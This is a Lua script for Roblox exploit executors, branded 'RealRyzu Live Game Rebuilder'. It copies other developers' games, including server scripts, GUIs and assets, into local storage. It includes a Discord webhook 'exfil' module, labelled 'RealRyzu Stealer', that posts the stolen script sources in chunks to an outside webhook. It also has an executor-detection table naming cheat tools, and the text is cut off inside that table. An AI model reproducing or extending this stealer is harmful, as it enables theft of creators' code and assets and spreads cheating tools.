-- RealRyzu v2.2 | LIVE GAME REBUILDER
-- Clones directly into REAL services — game runs when you hit play
-- Scripts execute, GUIs appear, paths resolve, everything works
-- Full watermark + local save + asset rip + discord exfil
-- RealRyzu Development | discord.gg/realryzu

local RYZU_WATERMARK = [[
--[[
    ██████╗ ███████╗ █████╗ ██╗     ██████╗ ██╗   ██╗███████╗██╗   ██╗
    ██╔══██╗██╔════╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝╚══███╔╝██║   ██║
    ██████╔╝█████╗  ███████║██║     ██████╔╝ ╚████╔╝   ███╔╝ ██║   ██║
    ██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██╗  ╚██╔╝   ███╔╝  ██║   ██║
    ██║  ██║███████╗██║  ██║███████╗██║  ██║   ██║   ███████╗╚██████╔╝
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝
    
    RealRyzu Development
    discord.gg/realryzu
--]]

]]

local WATERMARK_SHORT = "--[[ REALRYZU | discord.gg/realryzu ]]--"

-- ═══════════════════════════════════════════════════════════════════════
-- SERVICES
-- ═══════════════════════════════════════════════════════════════════════
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui") or (Players.LocalPlayer and Players.LocalPlayer:WaitForChild("PlayerGui"))
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local StarterPlayer = game:GetService("StarterPlayer")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local Chat = game:GetService("Chat")
local Teams = game:GetService("Teams")
local MarketplaceService = game:GetService("MarketplaceService")
local TextChatService = game:GetService("TextChatService")
local GroupService = game:GetService("GroupService")
local PhysicsService = game:GetService("PhysicsService")
local TweenService = game:GetService("TweenService")
local CollectionService = game:GetService("CollectionService")
local ContextActionService = game:GetService("ContextActionService")
local BadgeService = game:GetService("BadgeService")
local SocialService = game:GetService("SocialService")
local AnalyticsService = game:GetService("AnalyticsService")
local AvatarEditorService = game:GetService("AvatarEditorService")
local LocalizationService = game:GetService("LocalizationService")
local MemoryStoreService = game:GetService("MemoryStoreService")
local MessagingService = game:GetService("MessagingService")
local PathfindingService = game:GetService("PathfindingService")
local PointsService = game:GetService("PointsService")
local PolicyService = game:GetService("PolicyService")
local TeleportService = game:GetService("TeleportService")
local VRService = game:GetService("VRService")

-- ═══════════════════════════════════════════════════════════════════════
-- LIVE CLONE TARGETS — content goes into the REAL services
-- ═══════════════════════════════════════════════════════════════════════
local CLONE_TARGETS = {
    {
        Source = ServerScriptService,
        Dest = ServerScriptService,
        Name = "ServerScriptService",
        Description = "Server scripts — execute when game runs",
        Critical = true,
    },
    {
        Source = ReplicatedStorage,
        Dest = ReplicatedStorage,
        Name = "ReplicatedStorage",
        Description = "Shared content — replicates to all clients",
        Critical = true,
    },
    {
        Source = ServerStorage,
        Dest = ServerStorage,
        Name = "ServerStorage",
        Description = "Server-only storage — not replicated",
        Critical = false,
    },
    {
        Source = StarterGui,
        Dest = StarterGui,
        Name = "StarterGui",
        Description = "GUI templates — given to players on spawn",
        Critical = true,
    },
    {
        Source = StarterPack,
        Dest = StarterPack,
        Name = "StarterPack",
        Description = "Tools given to players on spawn",
        Critical = true,
    },
    {
        Source = StarterPlayer,
        Dest = StarterPlayer,
        Name = "StarterPlayer",
        Description = "Player scripts — LocalScripts run on client",
        Critical = true,
    },
    {
        Source = Workspace,
        Dest = Workspace,
        Name = "Workspace",
        Description = "World objects — parts, models, terrain",
        Critical = true,
    },
    {
        Source = Lighting,
        Dest = Lighting,
        Name = "Lighting",
        Description = "Lighting settings, skyboxes, post-processing",
        Critical = false,
    },
    {
        Source = SoundService,
        Dest = SoundService,
        Name = "SoundService",
        Description = "Global sounds and sound groups",
        Critical = false,
    },
    {
        Source = Chat,
        Dest = Chat,
        Name = "Chat",
        Description = "Chat service configuration",
        Critical = false,
    },
    {
        Source = Teams,
        Dest = Teams,
        Name = "Teams",
        Description = "Team definitions",
        Critical = false,
    },
}

-- Services we NEVER clone (engine internals, security risks)
local BLOCKED_SERVICES = {
    "Players", "CoreGui", "CorePackages", "HttpService",
    "RunService", "UserInputService", "TeleportService",
    "MarketplaceService", "InsertService", "Stats",
    "PhysicsService", "TweenService", "CollectionService",
    "BadgeService", "PolicyService", "LocalizationService",
    "TextService", "ContextActionService", "SocialService",
    "GamePassService", "AnalyticsService", "PointsService",
    "AvatarEditorService", "GroupService", "MessagingService",
    "DataStoreService", "ScriptContext", "NetworkClient",
    "NetworkServer", "LogService", "MemoryStoreService",
    "PathfindingService", "VRService",
}

-- ═══════════════════════════════════════════════════════════════════════
-- CLASS CLONE REGISTRY — handles every instance type correctly
-- ═══════════════════════════════════════════════════════════════════════
local ClassCloner = {}

-- Properties that reference other instances (need remapping after clone)
local REFERENCE_PROPERTIES = {
    "Attachment0", "Attachment1", "Attachment2",
    "PrimaryPart", "RootPart", "CurrentCamera",
    "Target", "WeldConstraint",
    "ManualWeld", "Weld", "Motor6D", "Motor",
    "HingeConstraint", "RopeConstraint",
    "SpringConstraint", "CylindricalConstraint",
    "BallSocketConstraint", "UniversalConstraint",
    "PrismaticConstraint", "PlaneConstraint",
    "RodConstraint", "AlignPosition", "AlignOrientation",
    "RigidConstraint", "VectorForce", "Torque",
    "BodyForce", "BodyVelocity", "BodyPosition",
    "BodyGyro", "BodyThrust", "BodyAngularVelocity",
    "RocketPropulsion", "ClickDetector",
    "ProximityPrompt", "RemoteEvent", "RemoteFunction",
    "BindableEvent", "BindableFunction",
    "Adornee", "CameraSubject", "Camera",
}

-- Simple properties to copy per class
local CLASS_PROPERTY_MAP = {
    Script = {"Source", "Enabled", "LinkedSource", "RunContext"},
    LocalScript = {"Source", "Enabled", "LinkedSource", "RunContext"},
    ModuleScript = {"Source", "LinkedSource"},
    
    Part = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
           "Material", "Transparency", "Reflectance", "Size", "Position",
           "Orientation", "CFrame", "Velocity", "RotVelocity", "Massless",
           "RootPriority", "CustomPhysicalProperties", "CollisionGroupId"},
    WedgePart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
                "Material", "Transparency", "Reflectance", "Size", "Position",
                "Orientation", "CFrame"},
    CornerWedgePart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
                      "Material", "Transparency", "Reflectance", "Size", "Position",
                      "Orientation", "CFrame"},
    TrussPart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
                "Material", "Transparency", "Reflectance", "Size", "Position",
                "Orientation", "CFrame"},
    SpawnLocation = {"Duration", "Neutral", "TeamColor", "AllowTeamChangeOnTouch",
                    "CFrame", "Size", "Anchored", "CanCollide", "Transparency"},
    Seat = {"MaxSpeed", "Torque", "Throttle", "Steer", "Disabled", "HeadsUpDisplay"},
    VehicleSeat = {"MaxSpeed", "Torque", "Throttle", "Steer", "Disabled", "HeadsUpDisplay"},
    
    MeshPart = {"Anchored", "CanCollide", "CanTouch", "CastShadow", "Color",
               "Material", "Transparency", "Reflectance", "Size", "Position",
               "Orientation", "CFrame", "MeshId", "TextureID", "InitialSize"},
    UnionOperation = {"Anchored", "CanCollide", "CanTouch", "CastShadow",
                     "Material", "Transparency", "Reflectance", "Size", "Position",
                     "Orientation", "CFrame", "UsePartColor", "InitialSize",
                     "AssetId", "ChildData"},
    NegateOperation = {"Anchored", "CanCollide", "CanTouch", "CastShadow",
                      "Material", "Transparency", "Reflectance", "Size", "Position",
                      "Orientation", "CFrame", "UsePartColor"},
    
    Model = {"PrimaryPart", "LevelOfDetail", "Scale"},
    Folder = {},
    Configuration = {},
    
    Humanoid = {"Health", "MaxHealth", "WalkSpeed", "JumpPower", "JumpHeight",
               "HipHeight", "AutoRotate", "PlatformStand", "DisplayDistanceType",
               "HealthDisplayDistance", "NameDisplayDistance", "NameOcclusion",
               "RequiresNeck", "RigType", "Sit", "WalkToPart", "WalkToPoint",
               "UseJumpPower", "BreakJointsOnDeath"},
    AnimationController = {},
    Animator = {},
    
    Camera = {"CameraType", "CameraSubject", "FieldOfView", "CFrame", "Focus",
             "HeadLocked", "HeadScale"},
    
    Tool = {"ToolTip", "RequiresHandle", "CanBeDropped", "ManualActivationOnly",
           "Enabled", "Grip", "GripForward", "GripPos", "GripRight", "GripUp",
           "TextureId"},
    HopperBin = {"BinType", "TextureId"},
    
    Sound = {"SoundId", "SoundGroup", "Volume", "Pitch", "Looped", "IsLoaded",
            "PlaybackSpeed", "PlaybackRegionsEnabled", "TimePosition",
            "EmitterSize", "RollOffMode", "RollOffMinDistance", "RollOffMaxDistance",
            "RollOffMaxDistance"},
    SoundGroup = {"Volume"},
    
    Animation = {"AnimationId"},
    
    ParticleEmitter = {"Texture", "Rate", "Lifetime", "Speed", "SpreadAngle",
                      "Color", "Size", "Transparency", "ZOffset", "Enabled",
                      "Acceleration", "Drag", "EmissionDirection", "LockedToPart",
                      "Orientation", "RotSpeed", "RotSpreadAngle", "Shape",
                      "ShapeInOut", "ShapePartial", "Squash", "TimeScale",
                      "VelocityInheritance", "VelocitySpread"},
    Trail = {"Texture", "Lifetime", "Color", "Enabled", "Length",
            "MaxLength", "MinLength", "Transparency", "WidthScale"},
    Beam = {"Texture", "Color", "Enabled", "Width0", "Width1",
           "CurveSize0", "CurveSize1", "FaceCamera", "LightEmission",
           "LightInfluence", "Segments", "TextureLength", "TextureMode",
           "TextureSpeed", "Transparency", "ZOffset"},
    Sparkles = {"SparkleColor", "Enabled"},
    Fire = {"Color", "Enabled", "Heat", "Size", "Color"},
    Smoke = {"Color", "Enabled", "Opacity", "RiseVelocity", "Size"},
    Explosion = {"BlastRadius", "DestroyJointRadiusPercent", "BlastPressure",
                "Position", "Visible", "ExplosionType"},
    
    Attachment = {"Position", "Rotation", "Axis", "Visible", "WorldPosition",
                 "WorldRotation", "WorldAxis"},
    Bone = {"Position", "Rotation"},
    Skeleton = {},
    
    ScreenGui = {"Enabled", "ResetOnSpawn", "ZIndexBehavior", "DisplayOrder",
                "IgnoreGuiInset", "SafeAreaCompatibility", "ScreenInsets",
                "ClipToDeviceSafeArea", "AutoLocalize"},
    SurfaceGui = {"Enabled", "Active", "Adornee", "AlwaysOnTop", "CanvasSize",
                 "ClipsDescendants", "Face", "LightInfluence", "PixelsPerStud",
                 "SizingMode", "ToolPunchThroughDistance", "ZOffset"},
    BillboardGui = {"Enabled", "Active", "Adornee", "AlwaysOnTop", "CanvasSize",
                   "ClipsDescendants", "DistanceLowerLimit", "DistanceUpperLimit",
                   "LightInfluence", "MaxDistance", "Size", "StudsOffset",
                   "StudsOffsetWorldSpace", "PlayerToHideFrom"},
    
    Frame = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
            "BorderMode", "BorderSizePixel", "ClipsDescendants", "Position",
            "Rotation", "Size", "Visible", "ZIndex", "Active", "AnchorPoint",
            "AutomaticSize", "LayoutOrder"},
    TextLabel = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                "BorderMode", "BorderSizePixel", "Font", "FontFace",
                "LineHeight", "MaxVisibleGraphemes", "RichText", "Text",
                "TextColor3", "TextScaled", "TextSize", "TextStrokeColor3",
                "TextStrokeTransparency", "TextTransparency", "TextTruncate",
                "TextWrapped", "TextXAlignment", "TextYAlignment"},
    TextButton = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                 "BorderMode", "BorderSizePixel", "Font", "FontFace",
                 "LineHeight", "MaxVisibleGraphemes", "RichText", "Text",
                 "TextColor3", "TextScaled", "TextSize", "TextStrokeColor3",
                 "TextStrokeTransparency", "TextTransparency", "TextTruncate",
                 "TextWrapped", "TextXAlignment", "TextYAlignment", "AutoButtonColor",
                 "Modal", "Selected"},
    TextBox = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
              "BorderMode", "BorderSizePixel", "Font", "FontFace", "LineHeight",
              "MaxVisibleGraphemes", "RichText", "Text", "TextColor3",
              "TextScaled", "TextSize", "TextStrokeColor3", "TextStrokeTransparency",
              "TextTransparency", "TextTruncate", "TextWrapped", "TextXAlignment",
              "TextYAlignment", "ClearTextOnFocus", "MultiLine", "PlaceholderText",
              "PlaceholderColor3", "ShowNativeInput", "TextEditable"},
    ImageLabel = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                 "BorderMode", "BorderSizePixel", "Image", "ImageColor3",
                 "ImageRectOffset", "ImageRectSize", "ImageTransparency",
                 "ResampleMode", "ScaleType", "SliceCenter", "SliceScale",
                 "TileSize"},
    ImageButton = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                  "BorderMode", "BorderSizePixel", "Image", "ImageColor3",
                  "ImageRectOffset", "ImageRectSize", "ImageTransparency",
                  "ResampleMode", "ScaleType", "SliceCenter", "SliceScale",
                  "TileSize", "AutoButtonColor", "Modal", "Selected"},
    ViewportFrame = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                    "BorderMode", "BorderSizePixel", "ImageColor3",
                    "ImageTransparency", "CurrentCamera", "Ambient", "LightColor",
                    "LightDirection"},
    CanvasGroup = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                  "BorderMode", "BorderSizePixel", "GroupColor3",
                  "GroupTransparency"},
    ScrollingFrame = {"BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                     "BorderMode", "BorderSizePixel", "CanvasPosition",
                     "CanvasSize", "ElasticBehavior", "HorizontalScrollBarInset",
                     "ScrollBarImageColor3", "ScrollBarImageTransparency",
                     "ScrollBarThickness", "ScrollingDirection", "ScrollingEnabled",
                     "VerticalScrollBarInset", "VerticalScrollBarPosition"},
    
    VideoFrame = {"Video", "Looped", "Playing", "Volume", "TimePosition",
                 "BackgroundColor3", "BackgroundTransparency", "BorderColor3",
                 "BorderMode", "BorderSizePixel"},
    
    UICorner = {"CornerRadius"},
    UIGradient = {"Color", "Transparency", "Rotation", "Enabled"},
    UIAspectRatioConstraint = {"AspectRatio", "DominantAxis", "AspectType"},
    UISizeConstraint = {"MinSize", "MaxSize"},
    UITextSizeConstraint = {"MaxTextSize", "MinTextSize"},
    UIGridLayout = {"CellPadding", "CellSize", "FillDirection", "FillDirectionMaxCells",
                   "HorizontalAlignment", "SortOrder", "StartCorner",
                   "VerticalAlignment", "AbsoluteContentSize", "AbsoluteSize"},
    UIListLayout = {"FillDirection", "HorizontalAlignment", "Padding",
                   "SortOrder", "VerticalAlignment", "Wraps",
                   "AbsoluteContentSize", "AbsoluteSize"},
    UIPageLayout = {"Circular", "EasingDirection", "EasingStyle", "GamepadInputEnabled",
                   "Padding", "SortOrder", "TweenTime", "Animated"},
    UITableLayout = {"FillDirection", "HorizontalAlignment", "MajorAxis",
                    "Padding", "SortOrder", "VerticalAlignment",
                    "AbsoluteContentSize", "AbsoluteSize"},
    UIPadding = {"PaddingBottom", "PaddingLeft", "PaddingRight", "PaddingTop"},
    UIScale = {"Scale"},
    UIStroke = {"Color", "Thickness", "Transparency", "ApplyStrokeMode",
               "Enabled", "LineJoinMode"},
    
    Decal = {"Texture", "Transparency", "Color3", "Face", "Shiny", "Specular",
            "LocalTransparencyModifier", "ZIndex"},
    Texture = {"Texture", "Transparency", "Color3", "Face", "StudsPerTileU",
              "StudsPerTileV", "OffsetStudsU", "OffsetStudsV", "ZIndex"},
    
    SurfaceLight = {"Angle", "Brightness", "Color", "Enabled", "Face", "Range",
                   "Shadows"},
    PointLight = {"Brightness", "Color", "Enabled", "Range", "Shadows"},
    SpotLight = {"Angle", "Brightness", "Color", "Enabled", "Face", "Range",
                "Shadows"},
    
    WeldConstraint = {"Enabled", "Part0", "Part1"},
    Motor6D = {"DesiredAngle", "MaxVelocity", "CurrentAngle", "Transform",
              "Enabled", "Part0", "Part1"},
    HingeConstraint = {"ActuatorType", "AngularSpeed", "CurrentAngle",
                      "LimitsEnabled", "LowerAngle", "MotorMaxAcceleration",
                      "MotorMaxTorque", "Radius", "Restitution", "ServoMaxTorque",
                      "TargetAngle", "UpperAngle", "Enabled", "Attachment0",
                      "Attachment1"},
    SpringConstraint = {"Coils", "Damping", "FreeLength", "LimitsEnabled",
                       "MaxForce", "MaxLength", "MinLength", "Radius",
                       "Stiffness", "Thickness", "Enabled", "Attachment0",
                       "Attachment1"},
    RopeConstraint = {"Length", "CurrentDistance", "Enabled", "Restitution",
                     "Thickness", "WinchEnabled", "WinchForce", "WinchSpeed",
                     "WinchTarget", "Attachment0", "Attachment1"},
    RodConstraint = {"Length", "CurrentDistance", "Enabled", "Thickness",
                    "Attachment0", "Attachment1"},
    CylindricalConstraint = {"ActuatorType", "AngularSpeed", "CurrentAngle",
                            "InclinationAngle", "LimitsEnabled", "LowerAngle",
                            "MotorMaxAcceleration", "MotorMaxTorque", "Radius",
                            "Restitution", "ServoMaxTorque", "TargetAngle",
                            "UpperAngle", "WorldRotation", "Enabled",
                            "Attachment0", "Attachment1"},
    BallSocketConstraint = {"LimitsEnabled", "MaxFrictionTorque", "Radius",
                           "Restitution", "TwistLimitsEnabled", "TwistLowerAngle",
                           "TwistUpperAngle", "UpperAngle", "Enabled",
                           "Attachment0", "Attachment1"},
    UniversalConstraint = {"LimitsEnabled", "MaxAngle", "Radius", "Restitution",
                          "Enabled", "Attachment0", "Attachment1"},
    PrismaticConstraint = {"ActuatorType", "CurrentPosition", "LimitsEnabled",
                          "LowerLimit", "MotorMaxAcceleration", "MotorMaxForce",
                          "Restitution", "ServoMaxForce", "Speed", "TargetPosition",
                          "UpperLimit", "Velocity", "Enabled", "Attachment0",
                          "Attachment1"},
    PlaneConstraint = {"Enabled", "Attachment0", "Attachment1"},
    
    AlignPosition = {"Mode", "MaxForce", "MaxVelocity", "ReactionForceEnabled",
                    "Responsiveness", "RigidityEnabled", "Enabled",
                    "Attachment0", "Attachment1"},
    AlignOrientation = {"Mode", "MaxAngularVelocity", "MaxTorque",
                       "ReactionTorqueEnabled", "Responsiveness",
                       "RigidityEnabled", "Enabled", "Attachment0", "Attachment1"},
    
    VectorForce = {"Force", "ApplyAtCenterOfMass", "Enabled", "RelativeTo",
                  "Attachment0"},
    Torque = {"Torque", "Enabled", "RelativeTo", "Attachment0"},
    BodyForce = {"Force", "Enabled"},
    BodyVelocity = {"Velocity", "Enabled", "MaxForce", "P"},
    BodyPosition = {"Position", "Enabled", "MaxForce", "P", "D"},
    BodyGyro = {"CFrame", "Enabled", "MaxTorque", "P", "D"},
    BodyThrust = {"Force", "Enabled", "Location"},
    BodyAngularVelocity = {"AngularVelocity", "Enabled", "MaxTorque", "P"},
    RocketPropulsion = {"CartoonFactor", "Enabled", "MaxSpeed", "MaxThrust",
                       "MaxTorque", "Target", "TargetOffset", "TargetRadius",
                       "ThrustD", "ThrustP", "TurnD", "TurnP"},
    
    ProximityPrompt = {"ActionText", "AutoLocalize", "ClickablePrompt",
                      "Enabled", "Exclusivity", "GamepadKeyCode",
                      "HoldDuration", "KeyboardKeyCode", "MaxActivationDistance",
                      "ObjectText", "RequiresLineOfSight", "RootLocalizationTable",
                      "Style", "TriggerEnded", "TriggerOffset"},
    ClickDetector = {"CursorIcon", "Enabled", "MaxActivationDistance",
                    "MouseHoverEnter", "MouseHoverLeave"},
    DragDetector = {"Activated", "ApplyAtCenterOfMass", "Axis", "DragFrame",
                   "DragStyle", "Enabled", "GamepadMode", "KeyboardMode",
                   "MaxDragAngle", "MaxDragTranslation", "MaxForce",
                   "MinDragAngle", "MinDragTranslation", "MouseMode",
                   "PermittedAxes", "PullTowardCenter", "ReferenceInstance",
                   "ResponseStyle", "RunLocally", "SelectionMode",
                   "TrackballRadialPullFactor", "TrackballRollFactor",
                   "TouchMode", "VREnabled", "VRMode"},
    
    Dialog = {"ConversationDistance", "Enabled", "GoodbyeChoiceActive",
             "GoodbyeDialog", "InUse", "InitialPrompt", "Purpose",
             "TriggerOffset", "Tone"},
    DialogChoice = {"GoodbyeChoiceActive", "GoodbyeDialog", "ResponseDialog",
                   "UserDialog"},
    
    RemoteEvent = {},
    RemoteFunction = {},
    BindableEvent = {},
    BindableFunction = {},
    CustomEvent = {},
    CustomEventReceiver = {},
    
    StringValue = {"Value"},
    IntValue = {"Value"},
    NumberValue = {"Value"},
    BoolValue = {"Value"},
    ObjectValue = {"Value"},
    BrickColorValue = {"Value"},
    CFrameValue = {"Value"},
    Color3Value = {"Value"},
    RayValue = {"Value"},
    Vector3Value = {"Value"},
    
    BodyColors = {"HeadColor3", "TorsoColor3", "LeftArmColor3",
                 "RightArmColor3", "LeftLegColor3", "RightLegColor3"},
    Shirt = {"ShirtTemplate", "Color3"},
    Pants = {"PantsTemplate", "Color3"},
    ShirtGraphic = {"Graphic", "Color3"},
    
    BlockMesh = {"Scale", "Offset", "VertexColor"},
    CylinderMesh = {"Scale", "Offset", "VertexColor"},
    SpecialMesh = {"Scale", "Offset", "VertexColor", "MeshId",
                  "MeshType", "TextureId"},
    FileMesh = {"Scale", "Offset", "VertexColor", "MeshId", "TextureId"},
    
    SelectionBox = {"Adornee", "Color", "LineThickness", "SurfaceColor",
                   "SurfaceTransparency", "Transparency", "Visible"},
    SelectionSphere = {"Adornee", "Color", "LineThickness", "SurfaceColor",
                      "SurfaceTransparency", "Transparency", "Visible"},
    
    ForceField = {"Visible"},
    
    Highlight = {"Adornee", "DepthMode", "Enabled", "FillColor",
                "FillTransparency", "OutlineColor", "OutlineTransparency"},
    
    HumanoidDescription = {"BackAccessory", "BodyTypeScale", "ClimbAnimation",
                          "DepthScale", "Face", "FaceAccessory", "FallAnimation",
                          "FrontAccessory", "GraphicTShirt", "HairAccessory",
                          "HatAccessory", "Head", "HeadColor", "HeadScale",
                          "HeightScale", "IdleAnimation", "JumpAnimation",
                          "LeftArm", "LeftArmColor", "LeftLeg", "LeftLegColor",
                          "NeckAccessory", "NumberOfPlayers", "Pants",
                          "ProportionScale", "RightArm", "RightArmColor",
                          "RightLeg", "RightLegColor", "RunAnimation",
                          "Shirt", "ShouldersAccessory", "SwimAnimation",
                          "Torso", "TorsoColor", "WaistAccessory",
                          "WalkAnimation", "WidthScale"},
    
    Team = {"AutoAssignable", "AutoColorCharacters", "TeamColor"},
    
    WrapTarget = {"CageMeshId", "HSRAssetId", "Stiffness"},
    WrapLayer = {"Enabled", "HSRAssetId", "Order", "ReferenceMeshId",
                "ShrinkFactor", "Stiffness"},
    
    NumberSequence = {},
    ColorSequence = {},
    NumberRange = {},
    
    AdvancedDragger = {},
    
    Sky = {"CelestialBodiesShown", "MoonAngularSize", "MoonTextureId",
          "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt",
          "SkyboxUp", "StarCount", "SunAngularSize", "SunTextureId"},
    Atmosphere = {"Density", "Glare", "Haze", "Color", "Decay", "Glow",
                 "Offset"},
    PostEffect = {"Enabled"},
    BloomEffect = {"Enabled", "Intensity", "Size", "Threshold"},
    BlurEffect = {"Enabled", "Size"},
    ColorCorrectionEffect = {"Brightness", "Contrast", "Enabled", "Saturation",
                            "TintColor"},
    DepthOfFieldEffect = {"Enabled", "FarIntensity", "FocusDistance",
                         "InFocusRadius", "NearIntensity"},
    SunRaysEffect = {"Enabled", "Intensity", "Spread"},
    
    NumberParticleEmitter = {},
}

-- ═══════════════════════════════════════════════════════════════════════
-- VIRTUAL FILESYSTEM FOR LOCAL EXPORT
-- ═══════════════════════════════════════════════════════════════════════
local VirtualFS = {}
VirtualFS.Root = {}
VirtualFS.TotalFiles = 0
VirtualFS.TotalBytes = 0
VirtualFS.FileList = {}

function VirtualFS:MakeDir(path)
    local parts = {}
    for segment in path:gmatch("[^/\\]+") do
        table.insert(parts, segment)
    end
    
    local node = self.Root
    for _, part in ipairs(parts) do
        if not node[part] then
            node[part] = {_type = "dir", _children = {}, _name = part}
        end
        node = node[part]._children
    end
end

function VirtualFS:WriteFile(path, content)
    local dirPath = path:match("(.*)[/\\]")
    local fileName = path:match("[/\\]?([^/\\]+)$")
    
    if dirPath and dirPath ~= "" then
        self:MakeDir(dirPath)
    end
    
    local parts = {}
    if dirPath and dirPath ~= "" then
        for segment in dirPath:gmatch("[^/\\]+") do
            table.insert(parts, segment)
        end
    end
    
    local node = self.Root
    for _, part in ipairs(parts) do
        if not node[part] then
            node[part] = {_type = "dir", _children = {}, _name = part}
        end
        node = node[part]._children
    end
    
    node[fileName] = {
        _type = "file", _name = fileName, _size = #content,
        _content = content, _time = os.time(),
    }
    
    self.TotalFiles = self.TotalFiles + 1
    self.TotalBytes = self.TotalBytes + #content
    
    table.insert(self.FileList, {
        path = (dirPath and dirPath .. "/" or "") .. fileName,
        size = #content,
    })
    
    return true
end

function VirtualFS:GetManifest()
    local lines = {}
    table.insert(lines, RYZU_WATERMARK)
    table.insert(lines, "")
    table.insert(lines, string.rep("═", 55))
    table.insert(lines, "  REALRYZU v2.2 — LIVE GAME REBUILDER MANIFEST")
    table.insert(lines, "  Game: " .. (game.PlaceId or "N/A"))
    local gameName = "Unknown"
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        if info and info.Name then gameName = info.Name end
    end)
    table.insert(lines, "  Game Name: " .. gameName)
    table.insert(lines, "  Total Files: " .. self.TotalFiles)
    table.insert(lines, "  Total Size: " .. string.format("%.2f MB", self.TotalBytes / 1048576))
    table.insert(lines, "  Date: " .. os.date("%Y-%m-%d %H:%M:%S"))
    table.insert(lines, string.rep("═", 55))
    table.insert(lines, "")
    
    table.sort(self.FileList, function(a, b) return a.path < b.path end)
    
    local currentDir = ""
    for _, file in ipairs(self.FileList) do
        local dir = file.path:match("(.*)[/\\]") or ""
        if dir ~= currentDir then
            currentDir = dir
            table.insert(lines, "")
            table.insert(lines, "── 📁 " .. currentDir .. "/ ──")
        end
        local fname = file.path:match("[/\\]?([^/\\]+)$") or file.path
        local sz = file.size > 1048576 and string.format("%.1f MB", file.size/1048576)
               or file.size > 1024 and string.format("%.1f KB", file.size/1024)
               or (file.size .. " B")
        table.insert(lines, "   📄 " .. fname .. " [" .. sz .. "]")
    end
    
    table.insert(lines, "")
    table.insert(lines, string.rep("═", 55))
    table.insert(lines, "  ALL FILES WATERMARKED — RealRyzu Development")
    table.insert(lines, "  discord.gg/realryzu")
    table.insert(lines, string.rep("═", 55))
    
    return table.concat(lines, "\n")
end

-- ═══════════════════════════════════════════════════════════════════════
-- DISCORD WEBHOOK EXFIL
-- ═══════════════════════════════════════════════════════════════════════
local DiscordExfil = {}
DiscordExfil.WebhookURL = ""
DiscordExfil.ChunkSize = 1900
DiscordExfil.ChunksSent = 0
DiscordExfil.TotalBytesSent = 0
DiscordExfil.LastSend = 0

function DiscordExfil:SetWebhook(url)
    if url and url:match("^https?://discord%.com/api/webhooks/%d+/") then
        self.WebhookURL = url
        return true
    end
    return false
end

function DiscordExfil:Send(content, filename)
    if self.WebhookURL == "" then return false, "no webhook" end
    
    local elapsed = tick() - self.LastSend
    if elapsed < 0.55 then task.wait(0.55 - elapsed) end
    
    local payload = {
        content = "```lua\n-- RealRyzu | " .. (filename or "file") .. "\n" .. content:sub(1, 1850) .. "\n```",
        username = "RealRyzu Stealer",
    }
    
    local ok, res = pcall(function()
        return HttpService:PostAsync(self.WebhookURL, HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson, false)
    end)
    
    self.LastSend = tick()
    if ok then
        self.ChunksSent = self.ChunksSent + 1
        self.TotalBytesSent = self.TotalBytesSent + #content
    end
    return ok, tostring(res)
end

function DiscordExfil:SendLarge(content, filename)
    local chunks = math.ceil(#content / self.ChunkSize)
    for i = 1, chunks do
        local s = (i-1)*self.ChunkSize + 1
        local e = math.min(i*self.ChunkSize, #content)
        local ok, err = self:Send(content:sub(s, e), filename .. " [" .. i .. "/" .. chunks .. "]")
        if not ok then return false, err end
        if i < chunks then task.wait(0.55) end
    end
    return true, chunks .. " chunks"
end

-- ═══════════════════════════════════════════════════════════════════════
-- EXECUTOR DETECTOR
-- ═══════════════════════════════════════════════════════════════════════
local ExecutorDetector = {}
ExecutorDetector.Database = {
    ["Synapse X"] = {markers = {"syn", "synapse", "sirhurt"}, funcs = {"syn.protect_gui", "syn.request"}, wt = 10},
    ["KRNL"] = {markers = {"krnl", "krnl_loaded", "iskrnlclosure"}, funcs = {}, wt = 9},
    ["ScriptWare"] = {markers = {"scriptware", "sw_"}, funcs = {}, wt = 8},
    ["Fluxus"] = {markers = {"fluxus", "flux_"}, funcs = {"fluxus.getbytecode"}, wt = 8},
    ["Electron"] = {markers = {"electron", "el_"}, funcs = {"electron.execute"}, wt = 7},
    ["Arceus X"] = {markers = {"arceus", "arc_"}, funcs = {}, wt = 6},
    ["Hydrogen"] = {markers = {"hydrogen", "hyd_"}, funcs = {}, wt = 6},
    ["Codex"] = {markers = {"codex", "cdx_"}, funcs = {}, wt = 5},
    ["Delta"] = {markers = {"delta", "delt_"}, funcs = {}, wt = 5},
    ["Vega X"] = {markers = {"vega", "vegax"}, funcs = {}, wt = 5},
    ["Solara"] = {markers = {"solara", "sol_"}, funcs = {}, wt = 5},
    ["Wave"] = {markers = {"wave", "wv_"}, funcs = {}, wt = 4},
    ["Celery"] = {markers = {"celery", "cel_"}, funcs = {}, wt = 4},
    ["Nihon"] = {markers = {"nihon", "nih_"}, funcs = {}, wt = 4},
    ["JJSploit"] = {markers = {"jjsploit", "wearedevs"}, funcs = {}, wt = 3},
